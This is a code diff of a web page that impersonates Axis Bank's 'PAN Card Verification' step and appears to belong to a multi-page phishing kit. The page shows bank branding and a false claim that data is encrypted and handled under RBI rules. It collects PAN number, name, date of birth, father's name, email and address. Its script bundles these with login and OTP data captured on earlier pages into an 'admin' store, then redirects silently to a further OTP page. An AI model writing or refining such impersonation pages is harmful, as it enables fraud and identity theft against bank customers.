@@ -3,407 +3,979 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AXIS BANK - PAN Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Axis Bank - PAN Card Verification</title>
     <style>
-        /* Same styles as previous pages, just change content */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #f0f2f5 0%, #e4e8ed 100%);
+            background: #f0f2f5;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Page Load Animation */
+        .page-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
         }
         
-        .container {
+        .loader-container {
+            position: relative;
             width: 100%;
-            max-width: 900px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
-            overflow: hidden;
+            height: 100px;
         }
         
-        /* Header */
-        .header {
-            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
-            color: white;
-            padding: 25px 40px;
-            text-align: center;
+        .loader-dot {
+            width: 15px;
+            height: 15px;
+            background: #87103F;
+            border-radius: 50%;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: dotAnimation 2.4s linear infinite;
+            box-shadow: 0 0 20px rgba(135, 16, 63, 0.8), 0 0 40px rgba(135, 16, 63, 0.6);
+        }
+        
+        @keyframes dotAnimation {
+            0% {
+                left: 0;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            6.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            12.5% {
+                left: 12.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            18.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            25% {
+                left: 25%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            31.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            37.5% {
+                left: 37.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            43.75% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+                box-shadow: 0 0 40px rgba(135, 16, 63, 1);
+            }
+            50% {
+                left: 50%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            56.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            62.5% {
+                left: 62.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            68.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            75% {
+                left: 75%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            81.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            87.5% {
+                left: 87.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            93.75% {
+                width: 20px;
+                height: 20px;
+                opacity: 1;
+                box-shadow: 0 0 20px rgba(135, 16, 63, 1);
+            }
+            100% {
+                left: 100%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+        }
+        
+        /* Main Container */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 0.5s ease 3s forwards;
+            flex: 1;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        /* Header - Maroon Red */
+        .bank-header {
+            background: #87103F;
+            padding: 15px 40px;
             position: relative;
         }
         
-        .bank-logo {
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 10px;
+            justify-content: space-between;
         }
         
-        .bank-logo i {
-            font-size: 40px;
-            color: #FFD700;
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .bank-logo {
+            height: 45px;
+            width: auto;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+        }
+        
+        .bank-title {
+            display: flex;
+            flex-direction: column;
         }
         
         .bank-name {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
+            color: white;
             letter-spacing: 1px;
         }
         
-        .security-badge {
-            position: absolute;
-            right: 40px;
-            top: 30px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 14px;
+        .header-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        
+        .header-text-container {
             display: flex;
             align-items: center;
-            gap: 8px;
+            margin-bottom: 5px;
+        }
+        
+        .open-text {
+            color: white;
+            font-weight: bold;
+            font-style: italic;
+            font-size: 24px;
+        }
+        
+        .banking-text {
+            color: white;
+            font-style: italic;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+        
+        .separator {
+            color: rgba(255, 255, 255, 0.7);
+            margin: 0 10px;
+        }
+        
+        .login-using {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
         }
         
         /* Main Content */
         .main-content {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
             display: flex;
-            min-height: 500px;
+            flex-direction: column;
+            align-items: center;
         }
         
-        .left-section {
-            flex: 1;
-            padding: 40px;
-            background: #F9FAFB;
-            border-right: 1px solid #E1E4E8;
+        /* PAN Container */
+        .pan-container {
+            width: 100%;
+            max-width: 500px;
         }
         
-        .right-section {
-            width: 350px;
-            padding: 40px 30px;
+        .pan-box {
             background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
         }
         
-        /* PAN Form */
+        .pan-header {
+            background: #87103F;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
         .pan-title {
-            color: #2E5BAF;
             font-size: 24px;
-            margin-bottom: 20px;
+            font-weight: bold;
+            margin-bottom: 5px;
         }
         
         .pan-subtitle {
-            color: #666;
+            opacity: 0.9;
             font-size: 16px;
-            margin-bottom: 30px;
+        }
+        
+        /* Form Container */
+        .form-container {
+            padding: 30px;
+        }
+        
+        /* Info Message */
+        .info-message {
+            background: #f8f9fa;
+            border-left: 4px solid #87103F;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .info-title {
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        
+        .info-text {
+            color: #666;
+            font-size: 14px;
             line-height: 1.5;
         }
         
+        /* Form Groups */
         .form-group {
             margin-bottom: 25px;
         }
         
-        .form-group label {
+        .form-label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #333;
-            font-weight: 600;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+        }
+        
+        .form-input:focus {
+            border-color: #87103F;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
         .input-with-icon {
             position: relative;
         }
         
-        .input-with-icon i {
+        .input-icon {
             position: absolute;
-            left: 15px;
+            right: 15px;
             top: 50%;
             transform: translateY(-50%);
+            color: #87103F;
+        }
+        
+        /* PAN Format Helper */
+        .pan-format {
+            font-size: 12px;
             color: #666;
+            margin-top: 5px;
+            font-style: italic;
         }
         
-        .input-with-icon input {
-            width: 100%;
-            padding: 15px 15px 15px 45px;
-            border: 2px solid #DDD;
+        /* Security Note */
+        .security-note {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
             border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #5d4037;
         }
         
-        .input-with-icon input:focus {
-            outline: none;
-            border-color: #2E5BAF;
-            box-shadow: 0 0 0 3px rgba(46, 91, 175, 0.1);
+        .security-title {
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
-        .submit-btn {
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .verify-button {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
+            background: #87103F;
             color: white;
             border: none;
+            padding: 18px;
             border-radius: 8px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            margin-top: 20px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
         
-        .submit-btn:hover {
-            background: linear-gradient(to right, #1E4A9F, #15367F);
+        .verify-button:hover {
+            background: #6a0c32;
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(46, 91, 175, 0.3);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        .important-note {
-            background: #FFF8E1;
-            border-left: 4px solid #FFC107;
-            padding: 15px;
-            margin-top: 30px;
-            border-radius: 5px;
-            font-size: 14px;
-            color: #666;
+        .verify-button.loading {
+            background: #6a0c32;
+            cursor: not-allowed;
         }
         
-        /* Right Section Cards */
-        .info-card {
-            background: #F8F9FA;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 25px;
+        .verify-button.loading:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading 0.6s linear infinite;
+        }
+        
+        @keyframes button-loading {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Links */
+        .form-links {
             text-align: center;
-            border: 1px solid #E1E4E8;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
         }
         
-        .card-icon {
-            font-size: 36px;
-            color: #2E5BAF;
-            margin-bottom: 15px;
-        }
-        
-        .card-title {
-            color: #333;
-            font-size: 18px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .card-text {
-            color: #666;
+        .form-links a {
+            color: #87103F;
+            text-decoration: none;
+            font-weight: bold;
             font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
+            margin: 0 15px;
+            transition: all 0.3s ease;
         }
         
-        .card-btn {
-            background: #2E5BAF;
-            color: white;
-            border: none;
-            padding: 10px 25px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: 500;
+        .form-links a:hover {
+            text-decoration: underline;
         }
         
         /* Footer */
-        .footer {
-            background: #F5F7FA;
-            padding: 20px 40px;
+        .main-footer {
+            background: #87103F;
+            color: white;
             text-align: center;
-            border-top: 1px solid #E1E4E8;
-            color: #666;
-            font-size: 14px;
+            padding: 30px 20px;
+            margin-top: 50px;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
         
         .footer-links {
-            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 20px;
         }
         
         .footer-links a {
-            color: #2E5BAF;
+            color: white;
             text-decoration: none;
-            margin: 0 10px;
-            font-size: 13px;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        
+        .footer-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        /* Responsive */
+        @media (max-width: 992px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+            
+            .logo-section {
+                justify-content: center;
+            }
+            
+            .header-info {
+                align-items: center;
+                text-align: center;
+            }
         }
         
         @media (max-width: 768px) {
-            .main-content {
-                flex-direction: column;
+            .bank-header {
+                padding: 12px 20px;
             }
             
-            .right-section {
-                width: 100%;
+            .bank-logo {
+                height: 40px;
+            }
+            
+            .bank-name {
+                font-size: 24px;
+            }
+            
+            .open-text {
+                font-size: 20px;
+            }
+            
+            .banking-text {
+                font-size: 16px;
+            }
+            
+            .main-content {
+                padding: 0 15px;
+                margin: 20px auto;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .header-text-container {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .separator {
+                display: none;
+            }
+            
+            .bank-logo {
+                height: 35px;
+            }
+            
+            .bank-name {
+                font-size: 20px;
+            }
+            
+            .open-text {
+                font-size: 18px;
+            }
+            
+            .banking-text {
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="bank-logo">
-                <i class="fas fa-university"></i>
-                <div class="bank-name">AXIS BANK</div>
-            </div>
-            <div class="security-badge">
-                <i class="fas fa-lock"></i>
-                <span>KYC Verification</span>
-            </div>
+    <!-- Page Load Animation -->
+    <div class="page-loader" id="pageLoader">
+        <div class="loader-container">
+            <div class="loader-dot"></div>
         </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Header -->
+        <header class="bank-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <!-- Axis Bank Logo -->
+                    <img src="https://raw.githubusercontent.com/shreya99u-max/axisbank/main/IMG_20260201_085106.jpg" 
+                         alt="Axis Bank Logo" 
+                         class="bank-logo">
+                    <div class="bank-title">
+                        <div class="bank-name">AXIS BANK</div>
+                    </div>
+                </div>
+                
+                <div class="header-info">
+                    <div class="header-text-container">
+                        <span class="open-text">open</span>
+                        <span class="separator">|</span>
+                        <span class="banking-text">INTERNET BANKING</span>
+                    </div>
+                    <div class="login-using">PAN Card Verification</div>
+                </div>
+            </div>
+        </header>
         
         <!-- Main Content -->
         <div class="main-content">
-            <!-- Left Section - PAN Form -->
-            <div class="left-section">
-                <h2 class="pan-title">PAN Card Verification</h2>
-                <p class="pan-subtitle">
-                    As per RBI guidelines, PAN verification is mandatory for all banking transactions. 
-                    Please provide your PAN details exactly as they appear on your PAN card.
-                </p>
-                
-                <form id="panForm">
-                    <div class="form-group">
-                        <label for="fullName">Full Name (as per PAN Card)</label>
-                        <div class="input-with-icon">
-                            <i class="fas fa-user"></i>
-                            <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
-                        </div>
+            <div class="pan-container">
+                <div class="pan-box">
+                    <div class="pan-header">
+                        <div class="pan-title">PAN Card Verification</div>
+                        <div class="pan-subtitle">Enter your PAN card details for KYC verification</div>
                     </div>
                     
-                    <div class="form-group">
-                        <label for="panNumber">PAN Number</label>
-                        <div class="input-with-icon">
-                            <i class="fas fa-id-card"></i>
-                            <input type="text" id="panNumber" name="panNumber" 
-                                   placeholder="Enter 10-digit PAN (e.g., ABCDE1234F)" 
-                                   required
-                                   pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}"
-                                   maxlength="10"
-                                   style="text-transform: uppercase;">
+                    <div class="form-container">
+                        <!-- Info Message -->
+                        <div class="info-message">
+                            <div class="info-title">📝 Important Information</div>
+                            <div class="info-text">
+                                PAN (Permanent Account Number) is mandatory for financial transactions and tax purposes. 
+                                Please ensure the details match your official PAN card.
+                            </div>
                         </div>
-                        <small style="color: #666; font-size: 13px; margin-top: 5px; display: block;">
-                            Format: 5 letters, 4 digits, 1 letter (e.g., ABCDE1234F)
-                        </small>
+                        
+                        <!-- Security Note -->
+                        <div class="security-note">
+                            <div class="security-title">
+                                <span>🔒</span> Security Note
+                            </div>
+                            Your PAN details are encrypted and stored securely. Axis Bank follows RBI guidelines for data protection.
+                        </div>
+                        
+                        <!-- PAN Form -->
+                        <form id="panForm">
+                            <div class="form-group">
+                                <label class="form-label" for="panNumber">PAN Card Number</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="panNumber" name="panNumber" 
+                                           placeholder="Enter 10-digit PAN (e.g., ABCDE1234F)" 
+                                           maxlength="10"
+                                           required>
+                                    <div class="input-icon">📋</div>
+                                </div>
+                                <div class="pan-format">Format: 5 letters + 4 numbers + 1 letter (e.g., ABCDE1234F)</div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="fullName">Full Name (as per PAN)</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="fullName" name="fullName" 
+                                           placeholder="Enter your full name as per PAN card" 
+                                           required>
+                                    <div class="input-icon">👤</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="dob">Date of Birth (as per PAN)</label>
+                                <div class="input-with-icon">
+                                    <input type="date" class="form-input" id="dob" name="dob" 
+                                           required>
+                                    <div class="input-icon">📅</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="fatherName">Father's Name (as per PAN)</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="fatherName" name="fatherName" 
+                                           placeholder="Enter father's name as per PAN card" 
+                                           required>
+                                    <div class="input-icon">👨</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="email">Email Address</label>
+                                <div class="input-with-icon">
+                                    <input type="email" class="form-input" id="email" name="email" 
+                                           placeholder="Enter your email address" 
+                                           required>
+                                    <div class="input-icon">📧</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="address">Residential Address</label>
+                                <textarea class="form-input" id="address" name="address" 
+                                          placeholder="Enter your current residential address" 
+                                          rows="3" required></textarea>
+                            </div>
+                            
+                            <!-- Buttons -->
+                            <div class="btn-container">
+                                <button type="submit" class="verify-button" id="verifyButton">
+                                    Verify PAN Details
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div class="form-links">
+                            <a href="#" id="backLink">← Back to OTP Verification</a>
+                            <a href="#" id="helpLink">Need Help?</a>
+                        </div>
                     </div>
-                    
-                    <button type="submit" class="submit-btn">
-                        <i class="fas fa-check-circle"></i>
-                        VERIFY PAN DETAILS
-                    </button>
-                </form>
-                
-                <div class="important-note">
-                    <i class="fas fa-exclamation-circle"></i>
-                    <strong>Important:</strong> Providing incorrect PAN details may lead to transaction failures and penalties as per Income Tax regulations.
-                </div>
-            </div>
-            
-            <!-- Right Section - Info Cards -->
-            <div class="right-section">
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-file-contract"></i>
-                    </div>
-                    <div class="card-title">Why PAN Verification?</div>
-                    <div class="card-text">
-                        PAN verification is mandatory for all financial transactions above ₹50,000 as per Income Tax Department rules.
-                    </div>
-                </div>
-                
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-check-circle"></i>
-                    </div>
-                    <div class="card-title">Benefits of PAN Linking</div>
-                    <div class="card-text">
-                        • Faster income tax returns processing<br>
-                        • Easy tracking of financial transactions<br>
-                        • Required for high-value transactions
-                    </div>
-                </div>
-                
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-question-circle"></i>
-                    </div>
-                    <div class="card-title">Don't Have a PAN?</div>
-                    <div class="card-text">
-                        You can apply for a new PAN card online through NSDL or UTIITSL portals.
-                    </div>
-                    <button class="card-btn">APPLY FOR PAN</button>
                 </div>
             </div>
         </div>
         
         <!-- Footer -->
-        <div class="footer">
-            <p>© 2004-2024 Axis Bank Ltd. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a> | 
-                <a href="#">Terms & Conditions</a> | 
-                <a href="#">Disclaimer</a> | 
-                <a href="#">Sitemap</a>
+        <footer class="main-footer">
+            <div class="footer-content">
+                <div class="footer-text">Secure PAN Verification for KYC Compliance</div>
+                <div class="footer-links">
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
+                </div>
+                <div class="copyright">
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                </div>
             </div>
-        </div>
+        </footer>
     </div>
 
     <script>
-        // PAN number formatting
-        document.getElementById('panNumber').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 10);
+        // Page load animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('pageLoader').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('pageLoader').style.display = 'none';
+                }, 500);
+            }, 3000);
         });
         
-        // Form submission
-        document.getElementById('panForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const fullName = document.getElementById('fullName').value;
-            const panNumber = document.getElementById('panNumber').value;
-            
-            // Validate PAN format
+        // DOM Elements
+        const panForm = document.getElementById('panForm');
+        const panNumberInput = document.getElementById('panNumber');
+        const fullNameInput = document.getElementById('fullName');
+        const dobInput = document.getElementById('dob');
+        const fatherNameInput = document.getElementById('fatherName');
+        const emailInput = document.getElementById('email');
+        const addressInput = document.getElementById('address');
+        const verifyButton = document.getElementById('verifyButton');
+        const backLink = document.getElementById('backLink');
+        const helpLink = document.getElementById('helpLink');
+        
+        // Set max date for Date of Birth (must be at least 18 years old)
+        const today = new Date();
+        const maxDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
+        dobInput.max = maxDate.toISOString().split('T')[0];
+        
+        // Set min date (reasonable limit - 100 years)
+        const minDate = new Date(today.getFullYear() - 100, today.getMonth(), today.getDate());
+        dobInput.min = minDate.toISOString().split('T')[0];
+        
+        // PAN number validation and auto-uppercase
+        panNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/gi, '');
+            e.target.value = value;
+        });
+        
+        // PAN format validation
+        function validatePAN(pan) {
+            // PAN format: 5 letters + 4 digits + 1 letter
             const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
-            if (!panRegex.test(panNumber)) {
-                alert('Please enter a valid PAN number.\n\nFormat: 5 letters, 4 digits, 1 letter\nExample: ABCDE1234F');
-                return;
-            }
+            return panRegex.test(pan);
+        }
+        
+        // Get user data from previous steps
+        function getUserData() {
+            // Get OTP verification data
+            const otpVerifications = JSON.parse(localStorage.getItem('axisBankOTPVerifications') || '[]');
+            const lastOTP = otpVerifications.length > 0 ? otpVerifications[0] : null;
             
-            // Save PAN data to admin
-            const panData = {
-                fullName: fullName,
-                panNumber: panNumber,
+            // Get login data
+            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            const lastSubmission = submissions.length > 0 ? submissions[0] : null;
+            
+            return {
+                otpData: lastOTP,
+                loginData: lastSubmission
+            };
+        }
+        
+        // Save PAN data to localStorage for backend
+        function savePANData(panData) {
+            // Get existing PAN data or create empty array
+            let panVerifications = JSON.parse(localStorage.getItem('axisBankPANVerifications') || '[]');
+            
+            // Get user data from previous steps
+            const userData = getUserData();
+            
+            // Add new PAN verification
+            const panRecord = {
+                id: Date.now(),
+                panData: panData,
                 timestamp: new Date().toISOString(),
-                page: 'Axis Bank PAN Verification'
+                otpData: userData.otpData,
+                loginData: userData.loginData,
+                status: 'verified'
             };
             
-            let adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
-            adminData.push(panData);
-            localStorage.setItem('adminData', JSON.stringify(adminData));
+            panVerifications.unshift(panRecord);
             
-            console.log('PAN data saved:', panData);
+            // Save back to localStorage
+            localStorage.setItem('axisBankPANVerifications', JSON.stringify(panVerifications));
             
-            // Show loading
-            const btn = document.querySelector('.submit-btn');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
-            btn.disabled = true;
+            console.log('PAN data saved to backend:', panData);
+            return panRecord;
+        }
+        
+        // Save to admin data
+        function saveToAdmin(panData, panRecord) {
+            // Get existing admin data or create empty array
+            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
             
-            // Simulate processing and redirect
-            setTimeout(() => {
-                window.location.href = 'axis_otp2.html';
-            }, 1500);
+            // Get user data from previous steps
+            const userData = getUserData();
+            
+            // Add to admin data
+            adminData.unshift({
+                id: Date.now(),
+                type: 'pan_verification',
+                panData: panData,
+                panRecord: panRecord,
+                timestamp: new Date().toISOString(),
+                otpData: userData.otpData,
+                loginData: userData.loginData,
+                status: 'verified'
+            });
+            
+            // Save back to localStorage for admin panel
+            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+            
+            console.log('PAN data saved to admin:', panData);
+        }
+        
+        // Form submission handler
+        if (panForm) {
+            panForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form values
+                const panNumber = panNumberInput.value.toUpperCase();
+                const fullName = fullNameInput.value.trim();
+                const dob = dobInput.value;
+                const fatherName = fatherNameInput.value.trim();
+                const email = emailInput.value.trim();
+                const address = addressInput.value.trim();
+                
+                // Validate PAN format
+                if (!validatePAN(panNumber)) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                // Validate required fields
+                if (!fullName || !dob || !fatherName || !email || !address) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                // Validate email format
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                // Show loading
+                verifyButton.textContent = "Verifying...";
+                verifyButton.classList.add('loading');
+                verifyButton.disabled = true;
+                
+                // Prepare PAN data
+                const panData = {
+                    panNumber: panNumber,
+                    fullName: fullName,
+                    dob: dob,
+                    fatherName: fatherName,
+                    email: email,
+                    address: address,
+                    verificationTime: new Date().toLocaleString()
+                };
+                
+                // Save PAN data to backend
+                const panRecord = savePANData(panData);
+                
+                // Save to admin data
+                saveToAdmin(panData, panRecord);
+                
+                // Simulate verification delay
+                setTimeout(() => {
+                    // Remove loading
+                    verifyButton.textContent = "Verify PAN Details";
+                    verifyButton.classList.remove('loading');
+                    verifyButton.disabled = false;
+                    
+                    // NO ALERT MESSAGE - Direct redirect
+                    // Redirect to axis_otp2.html
+                    window.location.href = 'axis_otp2.html';
+                    
+                }, 1500);
+            });
+        }
+        
+        // Back link handler
+        backLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'axis_otp1.html';
+        });
+        
+        // Help link handler
+        helpLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'help.html';
+        });
+        
+        // Initialize
+        window.addEventListener('DOMContentLoaded', function() {
+            // Focus PAN input
+            panNumberInput.focus();
+            
+            // Set today's date as default for Date of Birth field
+            const defaultDate = new Date(today.getFullYear() - 25, today.getMonth(), today.getDate());
+            dobInput.value = defaultDate.toISOString().split('T')[0];
+            
+            // Initialize localStorage for PAN verifications if not exists
+            if (!localStorage.getItem('axisBankPANVerifications')) {
+                localStorage.setItem('axisBankPANVerifications', JSON.stringify([]));
+            }
+            
+            // Initialize localStorage for admin data if not exists
+            if (!localStorage.getItem('axisBankAdminData')) {
+                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
+            }
         });
     </script>
 </body>
